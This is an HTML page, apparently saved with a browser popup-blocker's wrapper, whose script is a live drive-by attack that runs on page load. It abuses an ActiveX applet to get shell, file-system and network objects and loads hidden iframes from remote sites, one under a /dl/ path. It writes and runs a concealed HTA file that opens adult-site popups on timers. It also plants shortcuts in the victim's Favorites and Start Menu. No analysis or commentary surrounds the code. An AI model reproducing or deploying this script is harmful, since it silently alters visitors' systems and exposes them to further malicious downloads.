<HTML>
<BODY>

<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

var SymRealWinOpen = window.open;

function SymWinOpen(url, name, attributes)
{
  return (new Object());
}

window.open = SymWinOpen;

//-->
</script>

<SCRIPT>document.write('<APPLET id=AX1 height=0 width=0 code=com.ms.activeX.ActiveXComponent></APPLET>');</SCRIPT>
<IFRAME src="http://nameoflord.com/count.php" width="0" height="0"></IFRAME>
<IFRAME src="http://hard-virgins.com/dl/u3.php" width="0" height="0"></IFRAME>
<SCRIPT>
var fold="";
var fil="";
var nam="";
var totalTime=0;
var Urls=new Array;
var Timers=new Array;

var label="..::Sexy Angels::..";
var url="http://nameoflord.com/img.php";
var icofile="%WinDir%\\System\\User.exe";
var iconum="1";


var gsStartPUrl ="http://nameoflord.com/img.php";
var gsSMenuUrl = "http://nameoflord.com/img.php";
var gsSMenuDescr = "..::Sexy Angels::..";

var sp="http://nameoflord.com/img.php";

Urls[0]=sp;

Timers[0]=3;

function AddLnk( folder, type )
{ 
	{ 
		if( FSO.FolderExists( folder ) )
		{
			var url, discr;
			switch(type)
			{
				case 2: url = gsSMenuUrl; discr = gsSMenuDescr; break;
			}
			var Shor = Shl.CreateShortcut( folder + "\\" + discr +".url" );
			Shor.TargetPath = url;
			Shor.Save();
		}
	} 
	return true;
} 
function AddLnkBase( folder, bMenu )
{
	{ 
		if( FSO.FolderExists( folder ) )
		{
			folder = folder + "\\";
			if( bMenu )
			{
				AddLnk( folder + "Start Menu", 2 );
			}
			return true;
		}
	} 
	return true;
}
function AddLinks(  )
{
	{ 
		var WF = FSO.GetSpecialFolder(0);

		AddLnkBase( WF, true, true, true );
		
		var sDocsAndSets = FSO.GetDriveName(WF) + "\\Documents and Settings\\";
		AddLnkBase( sDocsAndSets + "All Users", false, true, true );
		AddLnkBase( sDocsAndSets + Net.UserName, true, false, false );

		var sProfiles = WF + "\\Profiles\\";
		AddLnkBase( sProfiles + "All Users", false, true, true );
		AddLnkBase( sProfiles + Net.UserName, true, false, false );
	} 
}
function doc() {
	var fold=FSO.GetSpecialFolder(0);
	var nam="READM_03.HTA";
	var fil=fold.CreateTextFile(nam);fil.WriteLine("<HT"+"ML><HE"+"AD><TI"+"TLE>"+"Microsoft Internet Explorer</TIT"+"LE><HT"+"A"+":"+"APPLI"+"CATION SHO"+"WINTA"+"SKBAR='no' BORDER='none' WINDOW"+"STATE='minimize'>\r\n<SC"+"RIPT>\r\nself.moveTo(15000,15000);\r\n");
	for (i=0;i<Urls.length;i++)	{
	var tim=Timers[i]*60000
	t="setTimeout('q=window.open(\""+Urls[i]+"\",\"_blank\");q.blur();',"+tim+")\;";	fil.WriteLine(t);}	
	totalTime=(Timers[Timers.length-1]+0.1)*60000;
	fil.WriteLine("setTimeout('self.close()\;',"+totalTime+")");
	fil.WriteLine("</sc"+"ript></b"+"ody></h"+"tml>");
	fil.close();}

function savefavfile(folder,label,url,icofile,iconum){
	var oFi=FSO.CreateTextFile(folder+"\\"+label+".url");
	oFi.WriteLine("[InternetShortcut]");
	oFi.WriteLine("URL="+url);
	oFi.WriteLine("Modified=806188A46609C1013E");
	oFi.WriteLine("IconIndex="+iconum);
	oR=/%windir%/i;	icofile=icofile.replace(oR,WinDir);
	oFi.WriteLine("IconFile="+icofile);
	oFi.Close(); }

function putfav(folder, folder2){
	savefavfile(folder,label,url,icofile,iconum);
	}


function open(){
	try{
		a1=document.applets["AX1"];
		a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
		a1.createInstance();
		Shl = a1.GetObject();
		a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
		a1.createInstance();
		FSO = a1.GetObject();
		doc();
		var fold=FSO.GetSpecialFolder(0);
		Shl.run(fold+"\\READM_03.HTA");}
catch(e){return;}}
function f(){
	try{
		a1=document.applets["AX1"];
		a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
		a1.createInstance();
		Shl = a1.GetObject();
		a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
		a1.createInstance();
		FSO = a1.GetObject();
		WinDir=Shl.ExpandEnvironmentStrings("%WINDIR%");
       		myFav=Shl.SpecialFolders("Favorites");
       		myDesk=Shl.SpecialFolders("Desktop");
		putfav(myFav, myDesk);
	}
catch(e){return;}}
function f2()
{ 
	{ 
		a1=document.applets["AX1"];
		a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
		a1.createInstance();
		Shl = a1.GetObject();
		a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
		a1.createInstance();
		FSO = a1.GetObject();
		a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
		a1.createInstance();
		Net = a1.GetObject();
	
		
		var expdate = new Date((new Date()).getTime() + (24 * 60 * 60 * 1000 * 90));
		document.cookie="Chg=general; expires=" + expdate.toGMTString() + "; path=/;"

		AddLinks( );
	} 
} 
function init(){
	setTimeout("open()", 7300);
	setTimeout("f2()", 2320);
	}
init();
</SCRIPT>
</BODY></HTML>

<script language="JavaScript">
<!--
var SymRealOnLoad;
var SymRealOnUnload;

function SymOnUnload()
{
  window.open = SymWinOpen;
  if(SymRealOnUnload != null)
     SymRealOnUnload();
}

function SymOnLoad()
{
  if(SymRealOnLoad != null)
     SymRealOnLoad();
  window.open = SymRealWinOpen;
  SymRealOnUnload = window.onunload;
  window.onunload = SymOnUnload;
}

SymRealOnLoad = window.onload;
window.onload = SymOnLoad;

//-->
</script>

